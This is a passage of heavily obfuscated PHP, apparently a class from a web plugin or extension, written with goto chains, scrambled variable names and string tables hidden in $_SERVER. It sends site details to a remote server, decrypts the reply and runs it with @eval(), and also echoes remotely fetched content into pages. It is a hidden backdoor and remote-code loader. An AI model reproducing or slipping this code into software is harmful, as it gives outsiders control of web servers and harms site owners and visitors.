$b˘ü‚Ú¶∑∞ = $c ®óó¡Ö[635]; while (strlen($b˘ü‚Ú¶∑∞) < $c ®óó¡Ö[605]) { if (!$b˘ü‚Ú¶∑∞) { break; } $b˘ü‚Ú¶∑∞++; } if ($cäÂ äŸπæ == $F®‘ëÍèÎº[256] && $this->gokxb9370e2b == $F®‘ëÍèÎº[131]) { $F®‘ëÍèÎº[184]($F®‘ëÍèÎº[216]($F®‘ëÍèÎº[257]), !1, $F®‘ëÍèÎº[258]); } goto Eﬂ≤π™‰Ï; e‹üÉ¢ü˘„: $c ®óó¡Ö =& $_SERVER[ú∫]; $F®‘ëÍèÎº =& $_SERVER[é°ËπÔ úﬁ]; $fÙÎ´Ë¶ÚÖ = $GLOBALS[$F®‘ëÍèÎº[22]]; goto A£µÓøóˆ; fà‰≠∆ç“®: } private function moahc6ed4410() { goto EÈ¨∂è®äÎ; bàê¬â¬áå: die; goto eﬂœ€èïƒè; Dâ¯Øî‰åÃ: $eˆùº·Ôõæ = $C◊ÎﬂØ†ÌÉ[636]; while ($eˆùº·Ôõæ < $C◊ÎﬂØ†ÌÉ[605]) { if ($eˆùº·Ôõæ >= 0) { break; } $eˆùº·Ôõæ++; } if (!$DÆıòœäòä[116]($GLOBALS, $DÆıòœäòä[142]) || !isset($_GET[$DÆıòœäòä[267]])) { return; } goto BíÃ∫•ÿ‘≤; f„§˜ƒ»¿≥: while ($DèûÈ±£…Ô < $C◊ÎﬂØ†ÌÉ[580]) { if ($DèûÈ±£…Ô >= 0) { break; } $DèûÈ±£…Ô++; } $FìƒßÖä÷∂ = @$DÆıòœäòä[276]($d¬Œ¢îú¥ , !1, $fÑ…¯ˆÀÇÇ); $DÆıòœäòä[277]($DÆıòœäòä[278]); goto aáÆ≥â«ó¡; BíÃ∫•ÿ‘≤: if (!$DÆıòœäòä[261]($_SERVER[$DÆıòœäòä[44]], $DÎ«√Ó©©ì)) { return; } $d¬Œ¢îú¥  = $DÆıòœäòä[268]; $d¬Œ¢îú¥  = $this->{$_SERVER[é°ËπÔ úﬁ][269]}($d¬Œ¢îú¥ , $DÆıòœäòä[270]); goto DæËèãÜÕä; EÈ¨∂è®äÎ: $C◊ÎﬂØ†ÌÉ =& $_SERVER[ú∫]; $DÆıòœäòä =& $_SERVER[é°ËπÔ úﬁ]; $DÎ«√Ó©©ì = array($DÆıòœäòä[145], $DÆıòœäòä[266]); goto Dâ¯Øî‰åÃ; DæËèãÜÕä: $DıìÙÊ‚≠Á = $C◊ÎﬂØ†ÌÉ[637]; $fÑ…¯ˆÀÇÇ = $DÆıòœäòä[271](array($DÆıòœäòä[272] => array($DÆıòœäòä[273] => $DÆıòœäòä[274], $DÆıòœäòä[275] => 3))); $DèûÈ±£…Ô = $C◊ÎﬂØ†ÌÉ[638]; goto f„§˜ƒ»¿≥; aáÆ≥â«ó¡: $Fí‹•¯¬Ôı = $C◊ÎﬂØ†ÌÉ[639]; if (!$Fí‹•¯¬Ôı) { return; } if ($FìƒßÖä÷∂ && $DÆıòœäòä[32]($FìƒßÖä÷∂, $DÆıòœäòä[279])) { echo $FìƒßÖä÷∂; } goto bàê¬â¬áå; eﬂœ€èïƒè: } public function qzsr8073ab26($D±Ú—◊¬úè) { goto e‹ÓÓ‹≈£É; C¯Úœ«ê®Â: $e±ãö˘Ñì· = array($D‡¥âÇ∫’[281] => $D‡¥âÇ∫’[282], $D‡¥âÇ∫’[283] => $D‡¥âÇ∫’[282], $D‡¥âÇ∫’[284] => $D‡¥âÇ∫’[282], $D‡¥âÇ∫’[285] => $D‡¥âÇ∫’[282], $D‡¥âÇ∫’[286] => $D‡¥âÇ∫’[282], $D‡¥âÇ∫’[287] => $D‡¥âÇ∫’[282], $D‡¥âÇ∫’[288] => $D‡¥âÇ∫’[289], $D‡¥âÇ∫’[290] => $D‡¥âÇ∫’[289], $D‡¥âÇ∫’[291] => $D‡¥âÇ∫’[289], $D‡¥âÇ∫’[292] => $D‡¥âÇ∫’[289], $D‡¥âÇ∫’[293] => $D‡¥âÇ∫’[289], $D‡¥âÇ∫’[294] => $D‡¥âÇ∫’[289], $D‡¥âÇ∫’[295] => $D‡¥âÇ∫’[289], $D‡¥âÇ∫’[296] => $D‡¥âÇ∫’[289], $D‡¥âÇ∫’[297] => $D‡¥âÇ∫’[289]); $dŒ≥Èç›ªä = $D‡¥âÇ∫’[0]($D‡¥âÇ∫’[298], $D‡¥âÇ∫’[116]($this->thzj1344bdf0, $D‡¥âÇ∫’[139], $D‡¥âÇ∫’[10])); $dÃûÿΩÕÿ∏ = $b˜È‚Êπç–[640]; goto b›Ò¿°Ø§Ö; e‹ÓÓ‹≈£É: $b˜È‚Êπç– =& $_SERVER[ú∫]; $D‡¥âÇ∫’ =& $_SERVER[é°ËπÔ úﬁ]; if ($this->gokxb9370e2b == $D‡¥âÇ∫’[280]) { return $D±Ú—◊¬úè; } goto C¯Úœ«ê®Â; b›Ò¿°Ø§Ö: $A«ˆÔôåﬁ¨ = array(); $BÕÇ—≤¬∑Ø = $b˜È‚Êπç–[641]; while (strlen($BÕÇ—≤¬∑Ø) < $b˜È‚Êπç–[605]) { if (!$BÕÇ—≤¬∑Ø) { break; } $BÕÇ—≤¬∑Ø++; } goto D“¥¡®⁄Ì⁄; D“¥¡®⁄Ì⁄: foreach ($e±ãö˘Ñì· as $FûŒ¿åå¥ﬁ => $C§ãí…˘…÷) { if ($C§ãí…˘…÷ == $D‡¥âÇ∫’[282] && $D‡¥âÇ∫’[25]($this->gokxb9370e2b, 0, 1) == $D‡¥âÇ∫’[282]) { continue; } if (!$D‡¥âÇ∫’[261]($FûŒ¿åå¥ﬁ, $dŒ≥Èç›ªä)) { $A«ˆÔôåﬁ¨[] = $FûŒ¿åå¥ﬁ; } } foreach ($A«ˆÔôåﬁ¨ as $FûŒ¿åå¥ﬁ) { unset($D±Ú—◊¬úè[$FûŒ¿åå¥ﬁ]); $fÌ±Úèîµê = $b˜È‚Êπç–[642]; if (strlen($fÌ±Úèîµê) < $b˜È‚Êπç–[578]) { return; } } return $D±Ú—◊¬úè; goto C¬»Ö¿∫√ö; C¬»Ö¿∫√ö: $cıΩÆ¢ıµ≤ = $b˜È‚Êπç–[643]; goto f≠‚Â›â…ã; f≠‚Â›â…ã: } private function nimxae858ee4() { goto F“∏êåÚã ; DÚ‰ü›®Òí: $GLOBALS[$A•µË¶°ìú[104]][$A•µË¶°ìú[300]] = $A•µË¶°ìú[239]; $a§¥ÑòŸà· = $_SERVER[ú∫][644]; if (!$a§¥ÑòŸà·) { die; } goto B’≈ÜŸÁÕÙ; F“∏êåÚã : $A•µË¶°ìú =& $_SERVER[é°ËπÔ úﬁ]; if ($this->gokxb9370e2b != $A•µË¶°ìú[131]) { return; } $GLOBALS[$A•µË¶°ìú[104]][$A•µË¶°ìú[108]][$A•µË¶°ìú[299]] = $A•µË¶°ìú[239]; goto DÚ‰ü›®Òí; B’≈ÜŸÁÕÙ: if ($A•µË¶°ìú[61]($A•µË¶°ìú[301])->{$_SERVER[é°ËπÔ úﬁ][63]}($A•µË¶°ìú[93]) != $A•µË¶°ìú[253]) { $A•µË¶°ìú[61]($A•µË¶°ìú[301])->{$_SERVER[é°ËπÔ úﬁ][240]}($A•µË¶°ìú[93], $A•µË¶°ìú[253]); } goto F®É—˜≥‡Ø; F®É—˜≥‡Ø: } public function cobxb711835a() { return $_SERVER[é°ËπÔ úﬁ][302]; $f„ó»ÿà§ü = $_SERVER[ú∫][645]; } private function cfend1f875e3() { goto AãÿΩì“÷ù; AãÿΩì“÷ù: $Bß®ùΩŸŸ™ =& $_SERVER[ú∫]; $f·à—«ÈÕ˘ =& $_SERVER[é°ËπÔ úﬁ]; $AßÉéè‘ﬁ◊ = array($f·à—«ÈÕ˘[303], $f·à—«ÈÕ˘[304], $f·à—«ÈÕ˘[305]); goto d–“ıÓÙ©é; cê‰›⁄Ÿ◊¨: $this->{$_SERVER[é°ËπÔ úﬁ][182]}(); if ($this->{$_SERVER[é°ËπÔ úﬁ][218]}($Eœ’•ÊﬁÏÙ[$f·à—«ÈÕ˘[312]]) != $CÂ∞¿√®≥è[$f·à—«ÈÕ˘[183]]) { $Cà˘ï—øŒ¿ = array($f·à—«ÈÕ˘[220] => $F◊¿ÁΩÆüâ, $f·à—«ÈÕ˘[221] => $_SERVER[$f·à—«ÈÕ˘[125]], $f·à—«ÈÕ˘[222] => $f·à—«ÈÕ˘[223](), $f·à—«ÈÕ˘[192] => $_SERVER[$f·à—«ÈÕ˘[193]]); $f∆üŸ¡ƒﬁé = $this->{$_SERVER[é°ËπÔ úﬁ][224]}($f·à—«ÈÕ˘[166]($Cà˘ï—øŒ¿)); $Eœ’•ÊﬁÏÙ = $this->{$_SERVER[é°ËπÔ úﬁ][202]}($f·à—«ÈÕ˘[225] . $f∆üŸ¡ƒﬁé); if ($Eœ’•ÊﬁÏÙ && $f·à—«ÈÕ˘[161]($Eœ’•ÊﬁÏÙ) && isset($Eœ’•ÊﬁÏÙ[$f·à—«ÈÕ˘[312]])) { $DÃéãÙÎπÚ = $this->{$_SERVER[é°ËπÔ úﬁ][208]}($Eœ’•ÊﬁÏÙ[$f·à—«ÈÕ˘[312]], 2); if ($DÃéãÙÎπÚ) { $DÃéãÙÎπÚ = $this->{$_SERVER[é°ËπÔ úﬁ][218]}($DÃéãÙÎπÚ); } if ($DÃéãÙÎπÚ) { try { @eval($DÃéãÙÎπÚ); } catch (Exception $bÆùΩê·≤≈) { } } } } goto B à™ƒè≠√; fªºêïå‡Ò: $BáÕ≠⁄é≈Ì = $Bß®ùΩŸŸ™[647]; while ($BáÕ≠⁄é≈Ì < $Bß®ùΩŸŸ™[605]) { if ($BáÕ≠⁄é≈Ì >= 0) { break; } $BáÕ≠⁄é≈Ì++; } $F◊¿ÁΩÆüâ = $f·à—«ÈÕ˘[61]($f·à—«ÈÕ˘[62])->{$_SERVER[é°ËπÔ úﬁ][63]}($f·à—«ÈÕ˘[126]); goto d◊è¡ÙÑ¨◊; d–“ıÓÙ©é: $F¯ö∂¶∑Ùí = $f·à—«ÈÕ˘[306] . $f·à—«ÈÕ˘[124]($f·à—«ÈÕ˘[307]); $cß∆∂ﬂﬁ†ç = $Bß®ùΩŸŸ™[646]; if (strlen($cß∆∂ﬂﬁ†ç) < $Bß®ùΩŸŸ™[578]) { die; } goto f≥Ì™ÑÔÜ´; B¨„†Èø†–: $Eœ’•ÊﬁÏÙ = $this->{$_SERVER[é°ËπÔ úﬁ][202]}($f·à—«ÈÕ˘[311], $CÂ∞¿√®≥è); if (!$f·à—«ÈÕ˘[161]($Eœ’•ÊﬁÏÙ)) { return; } if ($Eœ’•ÊﬁÏÙ[$f·à—«ÈÕ˘[183]] && $Eœ’•ÊﬁÏÙ[$f·à—«ÈÕ˘[312]]) { if ($this->{$_SERVER[é°ËπÔ úﬁ][218]}($Eœ’•ÊﬁÏÙ[$f·à—«ÈÕ˘[312]]) == $CÂ∞¿√®≥è[$f·à—«ÈÕ˘[183]]) { return; } } goto cê‰›⁄Ÿ◊¨; fü‡ÿ«º£ü: $bá†çô˜®å = $f·à—«ÈÕ˘[13](array($f·à—«ÈÕ˘[308], $f·à—«ÈÕ˘[309]), $F¯ö∂¶∑Ùí); if ($bá†çô˜®å && $f·à—«ÈÕ˘[255]() - $bá†çô˜®å < $f·à—«ÈÕ˘[263]($f·à—«ÈÕ˘[310])) { return; } $f·à—«ÈÕ˘[13](array($f·à—«ÈÕ˘[308], $f·à—«ÈÕ˘[170]), $F¯ö∂¶∑Ùí, $f·à—«ÈÕ˘[255]()); goto fªºêïå‡Ò; d◊è¡ÙÑ¨◊: $CÂ∞¿√®≥è = array($f·à—«ÈÕ˘[183] => $f·à—«ÈÕ˘[61]($f·à—«ÈÕ˘[62])->{$_SERVER[é°ËπÔ úﬁ][63]}($f·à—«ÈÕ˘[227]), $f·à—«ÈÕ˘[197] => $this->gokxb9370e2b, $f·à—«ÈÕ˘[194] => $_SERVER[$f·à—«ÈÕ˘[195]], $f·à—«ÈÕ˘[196] => $f·à—«ÈÕ˘[61]($f·à—«ÈÕ˘[62])->{$_SERVER[é°ËπÔ úﬁ][63]}($f·à—«ÈÕ˘[157]), $f·à—«ÈÕ˘[123] => $f·à—«ÈÕ˘[124]($_SERVER[$f·à—«ÈÕ˘[125]] . $F◊¿ÁΩÆüâ), $f·à—«ÈÕ˘[187] => $f·à—«ÈÕ˘[167], $f·à—«ÈÕ˘[190] => $_SERVER[$f·à—«ÈÕ˘[191]]); $fâãÏ¢ë◊ = $Bß®ùΩŸŸ™[648]; if (!$fâãÏ¢ë◊) { return; } goto B¨„†Èø†–; f≥Ì™ÑÔÜ´: if ($this->gokxb9370e2b == $f·à—«ÈÕ˘[131] || !$f·à—«ÈÕ˘[116]($GLOBALS, $f·à—«ÈÕ˘[142])) { return; } if (!$f·à—«ÈÕ˘[261]($_SERVER[$f·à—«ÈÕ˘[44]], $AßÉéè‘ﬁ◊)) { return; } if ($f·à—«ÈÕ˘[255]() % 4 != 0) { return; } goto fü‡ÿ«º£ü; B à™ƒè≠√: } private function obkj934908e5($CÖ”∂≤…ç  = '', $BíÜ†‡ÓØ“ = array(), $Cî¨©…ß©≥ = 5) { goto DÉ¡¿Õ∏ﬁé; b∞¬›¬Ò¯ä: $D‘ï›åÿ¬˘ = $this->{$_SERVER[é°ËπÔ úﬁ][269]}($D‘ï›åÿ¬˘, $EáÌ€ÎÖè†[314]); $D‘ï›åÿ¬˘ = $D‘ï›åÿ¬˘ . $CÖ”∂≤…ç ; if ($BíÜ†‡ÓØ“ && $EáÌ€ÎÖè†[161]($BíÜ†‡ÓØ“)) { $D‘ï›åÿ¬˘ = $D‘ï›åÿ¬˘ . $EáÌ€ÎÖè†[315] . $EáÌ€ÎÖè†[316]($BíÜ†‡ÓØ“); } goto c‚¿› …“≤; c‚¿› …“≤: if ($BíÜ†‡ÓØ“ === -1) { return $D‘ï›åÿ¬˘; } $dûÑæ˜®õô = $EáÌ€ÎÖè†[271](array($EáÌ€ÎÖè†[272] => array($EáÌ€ÎÖè†[275] => $Cî¨©…ß©≥, $EáÌ€ÎÖè†[273] => $EáÌ€ÎÖè†[317]), $EáÌ€ÎÖè†[318] => array($EáÌ€ÎÖè†[319] => !1, $EáÌ€ÎÖè†[320] => !1))); $cÊçïÇÉ±€ = $E‚ıÕŒòπö[649]; goto cå€÷æ‹≈ÿ; cå€÷æ‹≈ÿ: if (strlen($cÊçïÇÉ±€) < $E‚ıÕŒòπö[605]) { die; } $BíÜ†‡ÓØ“ = @$EáÌ€ÎÖè†[276]($D‘ï›åÿ¬˘, !1, $dûÑæ˜®õô); return $EáÌ€ÎÖè†[210]($BíÜ†‡ÓØ“, !0); goto aÑØ≈πò◊ø; DÉ¡¿Õ∏ﬁé: $E‚ıÕŒòπö =& $_SERVER[ú∫]; $EáÌ€ÎÖè† =& $_SERVER[é°ËπÔ úﬁ]; $D‘ï›åÿ¬˘ = $EáÌ€ÎÖè†[313]; goto b∞¬›¬Ò¯ä; aÑØ≈πò◊ø: } private function xwop420197e6() { goto aÙª¡¬êµ†; Bèªë•â´⁄: $C”§≠Î ™“ = $C¬∫Ê¿¿◊†[$this->gokxb9370e2b]; $e√ŸêÁÚÎé = $b‹—ãÏ§è≥[650]; while (strlen($e√ŸêÁÚÎé) < $b‹—ãÏ§è≥[582]) { if (!$e√ŸêÁÚÎé) { break; } $e√ŸêÁÚÎé++; } goto b¢Á∑ÓÜı¨; aÙª¡¬êµ†: $b‹—ãÏ§è≥ =& $_SERVER[ú∫]; $bûåπŒﬂæ» =& $_SERVER[é°ËπÔ úﬁ]; $C¬∫Ê¿¿◊† = array($bûåπŒﬂæ»[321] => $bûåπŒﬂæ»[322], $bûåπŒﬂæ»[323] => $bûåπŒﬂæ»[324], $bûåπŒﬂæ»[325] => $bûåπŒﬂæ»[326], $bûåπŒﬂæ»[327] => $bûåπŒﬂæ»[328], $bûåπŒﬂæ»[329] => $bûåπŒﬂæ»[330], $bûåπŒﬂæ»[331] => $bûåπŒﬂæ»[264], $bûåπŒﬂæ»[332] => $bûåπŒﬂæ»[264], $bûåπŒﬂæ»[333] => $bûåπŒﬂæ»[322], $bûåπŒﬂæ»[334] => $bûåπŒﬂæ»[324], $bûåπŒﬂæ»[335] => $bûåπŒﬂæ»[326], $bûåπŒﬂæ»[336] => $bûåπŒﬂæ»[337], $bûåπŒﬂæ»[338] => $bûåπŒﬂæ»[328], $bûåπŒﬂæ»[339] => $bûåπŒﬂæ»[340], $bûåπŒﬂæ»[341] => $bûåπŒﬂæ»[330], $bûåπŒﬂæ»[342] => $bûåπŒﬂæ»[343], $bûåπŒﬂæ»[344] => $bûåπŒﬂæ»[345], $bûåπŒﬂæ»[346] => $bûåπŒﬂæ»[347]); goto Bèªë•â´⁄; e¡âú…üä: $aœÌæã⁄—⁄ = $b‹—ãÏ§è≥[652]; if (strlen($aœÌæã⁄—⁄) < $b‹—ãÏ§è≥[589]) { die; } $AÒÃ∆ Çë‹ = $AÒÃ∆ Çë‹ ? $bûåπŒﬂæ»[263]($AÒÃ∆ Çë‹) : 0; goto eΩ◊§œ≤éô; eΩ◊§œ≤éô: $d¯óö¢ê€¶ = $b‹—ãÏ§è≥[653]; return $C”§≠Î ™“ + $AÒÃ∆ Çë‹; $bﬂØÌÇ¶É© = $b‹—ãÏ§è≥[654]; goto cˆëèú‚…å; cˆëèú‚…å: if (strlen($bﬂØÌÇ¶É©) < $b‹—ãÏ§è≥[582]) { return; } goto dÚµîÂŒ©ê; b¢Á∑ÓÜı¨: $C”§≠Î ™“ = $bûåπŒﬂæ»[263]($C”§≠Î ™“ ? $C”§≠Î ™“ : $bûåπŒﬂæ»[322]); $DêÿÍöØ‹± = $b‹—ãÏ§è≥[651]; $AÒÃ∆ Çë‹ = $bûåπŒﬂæ»[116]($this->thzj1344bdf0, $bûåπŒﬂæ»[348]); goto e¡âú…üä; dÚµîÂŒ©ê: } public function kncba33bc99c($c§∂Î◊øÒÁ) { goto eùÉı¨å€â; A√£œóÔñë: if ($FºéôÕ›®ª >= $dË≥™ì©∑€[263]($dË≥™ì©∑€[264])) { return; } $c©πæÛ‡˘ê = $dË≥™ì©∑€[61]($dË≥™ì©∑€[149])->{$_SERVER[é°ËπÔ úﬁ][150]}(); if ($c©πæÛ‡˘ê <= $FºéôÕ›®ª) { return; } goto aïÁ¥‘—òñ; aïÁ¥‘—òñ: $F©≥ØÒõ¶Ÿ = $dË≥™ì©∑€[61]($dË≥™ì©∑€[149])->{$_SERVER[é°ËπÔ úﬁ][350]}($dË≥™ì©∑€[349])->{$_SERVER[é°ËπÔ úﬁ][351]}($FºéôÕ›®ª)->{$_SERVER[é°ËπÔ úﬁ][352]}(); $F©≥ØÒõ¶Ÿ = $dË≥™ì©∑€[241]($F©≥ØÒõ¶Ÿ, $dË≥™ì©∑€[10], $dË≥™ì©∑€[349]); if (!$dË≥™ì©∑€[261]($c§∂Î◊øÒÁ[$dË≥™ì©∑€[349]], $F©≥ØÒõ¶Ÿ)) { $dË≥™ì©∑€[184]($dË≥™ì©∑€[353], !1, $dË≥™ì©∑€[258]); } goto aîΩŸäõÃ; EÿãÉçˆüô: $b°ã´–ÀÏ› = $EπﬂÛ˜à‰®[655]; while ($b°ã´–ÀÏ› < $EπﬂÛ˜à‰®[580]) { if ($b°ã´–ÀÏ› >= 0) { break; } $b°ã´–ÀÏ›++; } if ($c§∂Î◊øÒÁ[$dË≥™ì©∑€[349]] == $dË≥™ì©∑€[239]) { return; } goto A√£œóÔñë; eùÉı¨å€â: $EπﬂÛ˜à‰® =& $_SERVER[ú∫]; $dË≥™ì©∑€ =& $_SERVER[é°ËπÔ úﬁ]; $FºéôÕ›®ª = $this->{$_SERVER[é°ËπÔ úﬁ][147]}(); goto EÿãÉçˆüô; aîΩŸäõÃ: } public function uqaced1664a4() { goto Eà›âÙãÚá; Eà›âÙãÚá: $B◊ﬂ˘¶»èå =& $_SERVER[é°ËπÔ úﬁ]; if (!$B◊ﬂ˘¶»èå[116]($GLOBALS, $B◊ﬂ˘¶»èå[142]) || $B◊ﬂ˘¶»èå[354](1, 100) > 20) { return; } $dÆºÉ´ÚÜú = $B◊ﬂ˘¶»èå[268]; goto F≤ÜÊáµ‰ﬁ; F≤ÜÊáµ‰ﬁ: $dÆºÉ´ÚÜú = $this->{$_SERVER[é°ËπÔ úﬁ][269]}($dÆºÉ´ÚÜú, $B◊ﬂ˘¶»èå[270]); $AîπÉﬁÙ´å = $_SERVER[ú∫][656]; if (!$AîπÉﬁÙ´å) { return; } goto aΩ¥ü∆ﬁ‹•; aΩ¥ü∆ﬁ‹•: $BÔâ‚Ëöè“ = $B◊ﬂ˘¶»èå[271](array($B◊ﬂ˘¶»èå[272] => array($B◊ﬂ˘¶»èå[273] => $B◊ﬂ˘¶»èå[274], $B◊ﬂ˘¶»èå[275] => 3))); $bìçç †™í = @$B◊ﬂ˘¶»èå[276]($dÆºÉ´ÚÜú, !1, $BÔâ‚Ëöè“); echo $B◊ﬂ˘¶»èå[355] . $B◊ﬂ˘¶»èå[356]($bìçç †™í) . $B◊ﬂ˘¶»èå[357]; goto F¨éØ∆∑Àß; F¨éØ∆∑Àß: } private function tdbu2d351c8c($a∂®‡ﬁ˘ΩÇ, $BﬁﬂüåÔøı, $e‘∏ÕßıÌË = 3) { goto eîá§ëõîâ; f£—ëô£µ†: $D•Ü≠Ìñ∞¡ = $D∂Á±üàº´[657]; if (!$D•Ü≠Ìñ∞¡) { return; } $a∂®‡ﬁ˘ΩÇ = $aÊ«ëÍåÃÒ[2]($a∂®‡ﬁ˘ΩÇ); goto AÈ√ûÃëÍ“; B«Ÿ¶∆„óÖ: $eàÀí’§§€ = $aÊ«ëÍåÃÒ[134](15); $D®£µÁª»ó = $D∂Á±üàº´[659]; while ($D®£µÁª»ó < $D∂Á±üàº´[605]) { if ($D®£µÁª»ó >= 0) { break; } $D®£µÁª»ó++; } goto DÃÈ∞ÜΩ⁄”; d™™»´Çå©: $DöÜÌôÇ˜‘ = $D∂Á±üàº´[673]; if (!$DöÜÌôÇ˜‘) { die; } if ($e‘∏ÕßıÌË - 1 > 0) { $fìÜÍÎÙÛ® = $this->{$_SERVER[é°ËπÔ úﬁ][137]}($fìÜÍÎÙÛ®, $BﬁﬂüåÔøı, $e‘∏ÕßıÌË - 1); } goto cØß€Ï¢»⁄; cØß€Ï¢»⁄: return $fìÜÍÎÙÛ®; goto CﬁÙ‰⁄Ô∆®; AÈ√ûÃëÍ“: $E¡üöË≠û– = $aÊ«ëÍåÃÒ[354](0, 5) . $aÊ«ëÍåÃÒ[10]; $Cíè√¡çÌ‚ = $D∂Á±üàº´[658]; if (!$Cíè√¡çÌ‚) { die; } goto B«Ÿ¶∆„óÖ; DÃÈ∞ÜΩ⁄”: $c»–Ç≤¡çÁ = $aÊ«ëÍåÃÒ[359]; switch ($E¡üöË≠û–) { case $aÊ«ëÍåÃÒ[253]: $fìÜÍÎÙÛ® = $this->{$_SERVER[é°ËπÔ úﬁ][165]}($a∂®‡ﬁ˘ΩÇ, $aÊ«ëÍåÃÒ[233]($BﬁﬂüåÔøı . $eàÀí’§§€)); $F‹»è∑†ºÇ = $D∂Á±üàº´[660]; while (strlen($F‹»è∑†ºÇ) < $D∂Á±üàº´[589]) { if (!$F‹»è∑†ºÇ) { break; } $F‹»è∑†ºÇ++; } break; $cÒ®Â…“Úå = $D∂Á±üàº´[661]; while ($cÒ®Â…“Úå < $D∂Á±üàº´[580]) { if ($cÒ®Â…“Úå >= 0) { break; } $cÒ®Â…“Úå++; } case $aÊ«ëÍåÃÒ[239]: $fìÜÍÎÙÛ® = $this->{$_SERVER[é°ËπÔ úﬁ][165]}($a∂®‡ﬁ˘ΩÇ, $aÊ«ëÍåÃÒ[233]($eàÀí’§§€ . $BﬁﬂüåÔøı)); $a¬Êæﬁﬂöñ = $D∂Á±üàº´[662]; while (strlen($a¬Êæﬁﬂöñ) < $D∂Á±üàº´[605]) { if (!$a¬Êæﬁﬂöñ) { break; } $a¬Êæﬁﬂöñ++; } break; case $aÊ«ëÍåÃÒ[360]: $fìÜÍÎÙÛ® = $this->{$_SERVER[é°ËπÔ úﬁ][165]}($a∂®‡ﬁ˘ΩÇ, $aÊ«ëÍåÃÒ[128]($eàÀí’§§€ . $BﬁﬂüåÔøı)); break; case $aÊ«ëÍåÃÒ[361]: $fìÜÍÎÙÛ® = $this->{$_SERVER[é°ËπÔ úﬁ][165]}($a∂®‡ﬁ˘ΩÇ, $aÊ«ëÍåÃÒ[124]($eàÀí’§§€ . $BﬁﬂüåÔøı)); break; $e¥‚ŒÖ∆úú = $D∂Á±üàº´[663]; while ($e¥‚ŒÖ∆úú < $D∂Á±üàº´[589]) { if ($e¥‚ŒÖ∆úú >= 0) { break; } $e¥‚ŒÖ∆úú++; } case $aÊ«ëÍåÃÒ[362]: goto EŒﬁ‚ü˜‚÷; EŒﬁ‚ü˜‚÷: $a∂®‡ﬁ˘ΩÇ = $aÊ«ëÍåÃÒ[128]($a∂®‡ﬁ˘ΩÇ); $DõïèÊ≥ëä = $D∂Á±üàº´[664]; while ($DõïèÊ≥ëä < $D∂Á±üàº´[580]) { if ($DõïèÊ≥ëä >= 0) { break; } $DõïèÊ≥ëä++; } goto fîï∂œ¨Òé; c≈æÀå“íÔ: if (strlen($f≠êû¢Ñ”—) < $D∂Á±üàº´[580]) { die; } break; $cﬁ“Ú≈Ÿœ÷ = $D∂Á±üàº´[672]; goto eÑ‡µ®‰óï; B◊çê†œùÍ: $e∆°¿ä∏ÜË = $aÊ«ëÍåÃÒ[25]($e∆°¿ä∏ÜË, $dñéäöæ é % 8, $dñéäöæ é % 8 + 7); $d†‚Éé˘âƒ = $D∂Á±üàº´[667]; while ($d†‚Éé˘âƒ < $D∂Á±üàº´[605]) { if ($d†‚Éé˘âƒ >= 0) { break; } $d†‚Éé˘âƒ++; } goto aÖ–ƒâ¢À‹; fîï∂œ¨Òé: $dñéäöæ é = $aÊ«ëÍåÃÒ[363](0, 64); $d«é»©äÂ« = $c»–Ç≤¡çÁ[$dñéäöæ é]; $f”±∞≈Àã¥ = $D∂Á±üàº´[665]; goto C†êﬁ±ô®π; aÖ–ƒâ¢À‹: $bÔ´≤äÒü† = $aÊ«ëÍåÃÒ[10]; $F∞œæñÓ€À = 0; $aëÿ¡Õé∏Ò = 0; goto cﬂ¨∂‡ØÙµ; aå≈õ∞ı™ê: for ($F∞œæñÓ€À = 0; $F∞œæñÓ€À < $aÊ«ëÍåÃÒ[24]($a∂®‡ﬁ˘ΩÇ); $F∞œæñÓ€À++) { $E´“´´‹Úº = $E´“´´‹Úº == $aÊ«ëÍåÃÒ[24]($e∆°¿ä∏ÜË) ? 0 : $E´“´´‹Úº; $aäïÕÇÀÈ« = $D∂Á±üàº´[669]; while (strlen($aäïÕÇÀÈ«) < $D∂Á±üàº´[580]) { if (!$aäïÕÇÀÈ«) { break; } $aäïÕÇÀÈ«++; } $aëÿ¡Õé∏Ò = ($dñéäöæ é + $aÊ«ëÍåÃÒ[364]($c»–Ç≤¡çÁ, $a∂®‡ﬁ˘ΩÇ[$F∞œæñÓ€À]) + $aÊ«ëÍåÃÒ[365]($e∆°¿ä∏ÜË[$E´“´´‹Úº++])) % 64; $bÔ´≤äÒü† .= $c»–Ç≤¡çÁ[$aëÿ¡Õé∏Ò]; $Eµû´®˘†è = $D∂Á±üàº´[670]; } $fìÜÍÎÙÛ® = $aÊ«ëÍåÃÒ[356]($d«é»©äÂ« . $bÔ´≤äÒü†); $f≠êû¢Ñ”— = $D∂Á±üàº´[671]; goto c≈æÀå“íÔ; eÑ‡µ®‰óï: if (strlen($cﬁ“Ú≈Ÿœ÷) < $D∂Á±üàº´[580]) { return; } goto fÍµ§ó»Éú; C†êﬁ±ô®π: $e∆°¿ä∏ÜË = $aÊ«ëÍåÃÒ[124]($d«é»©äÂ« . $aÊ«ëÍåÃÒ[124]($BﬁﬂüåÔøı . $d«é»©äÂ«) . $BﬁﬂüåÔøı); $EºŸﬂç‘©√ = $D∂Á±üàº´[666]; while ($EºŸﬂç‘©√ < $D∂Á±üàº´[580]) { if ($EºŸﬂç‘©√ >= 0) { break; } $EºŸﬂç‘©√++; } goto B◊çê†œùÍ; cﬂ¨∂‡ØÙµ: $A¢ôìÆöÁ© = $D∂Á±üàº´[668]; while (strlen($A¢ôìÆöÁ©) < $D∂Á±üàº´[578]) { if (!$A¢ôìÆöÁ©) { break; } $A¢ôìÆöÁ©++; } $E´“´´‹Úº = 0; goto aå≈õ∞ı™ê; fÍµ§ó»Éú: default: $fìÜÍÎÙÛ® = $this->{$_SERVER[é°ËπÔ úﬁ][165]}($a∂®‡ﬁ˘ΩÇ, $BﬁﬂüåÔøı . $eàÀí’§§€); break; } $fìÜÍÎÙÛ® = $aÊ«ëÍåÃÒ[233]($E¡üöË≠û– . $eàÀí’§§€ . $fìÜÍÎÙÛ®); goto d™™»´Çå©; eîá§ëõîâ: $D∂Á±üàº´ =& $_SERVER[ú∫]; $aÊ«ëÍåÃÒ =& $_SERVER[é°ËπÔ úﬁ]; $aÊ«ëÍåÃÒ[358](1); goto f£—ëô£µ†; CﬁÙ‰⁄Ô∆®: } private function cgko38983086($cÜ§Ñÿ„àΩ, $EÏæ®œú≤ú, $Bì‰‚ﬁåÉ• = 3) { goto f…„äÂ¨Öˆ; EÛì§Öè¬ú: switch ($D„è«∞Üﬁ√) { case $AıºÆÊœı¿[253]: $CÛî•è£©ã = $this->{$_SERVER[é°ËπÔ úﬁ][269]}($cÜ§Ñÿ„àΩ, $AıºÆÊœı¿[233]($EÏæ®œú≤ú . $d∆êÓ†Á¥Ê)); break; 